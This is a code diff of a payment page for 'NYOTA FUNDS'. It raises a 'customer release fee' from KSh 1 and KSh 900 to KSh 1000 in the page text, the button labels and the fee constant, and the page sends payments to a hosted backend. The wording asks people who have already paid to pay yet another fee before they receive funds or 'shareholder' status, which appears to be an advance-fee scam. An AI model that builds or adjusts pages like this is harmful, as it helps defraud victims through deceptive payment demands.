@@ -200,7 +200,7 @@ button:disabled{
 <h2>DISBURSEMENT FEE PAYMENT </h2>
 
 <p class="intro">
-    Congratulations 🤩 you're done with the payment  what is remaining is for you to pay a customer release fee of ksh 900 and then afterwards you'll became NYOTA FUNDS shareholder once more congratulations
+    Congratulations 🤩 you're done with the payment  what is remaining is for you to pay a customer release fee of ksh 1000 and then afterwards you'll became NYOTA FUNDS shareholder once more congratulations
 </p>
 
 
@@ -223,7 +223,7 @@ button:disabled{
 
 <small>Funds disbursement Fee</small>
 
-<strong>KSh 1</strong>
+<strong>KSh 1000</strong>
 
 </div>
 
@@ -232,7 +232,7 @@ button:disabled{
     id="payBtn"
     onclick="paySecurity()"
 >
-    Pay KSh 1
+    Pay KSh 1000
 </button>
 
 
@@ -255,7 +255,7 @@ const BACKEND =
     "https://nyota-funds-backend.onrender.com";
 
 
-const FEE = 1;
+const FEE = 1000;
 
 
 const button =
@@ -442,7 +442,7 @@ async function paySecurity(){
         button.disabled = false;
 
         button.textContent =
-            "Pay KSh 900";
+            "Pay KSh 1000";
 
     }
 
@@ -591,7 +591,7 @@ function checkPayment(transactionId){
                             false;
 
                         button.textContent =
-                            "Pay KSh 900";
+                            "Pay KSh 1000";
 
                     }
 
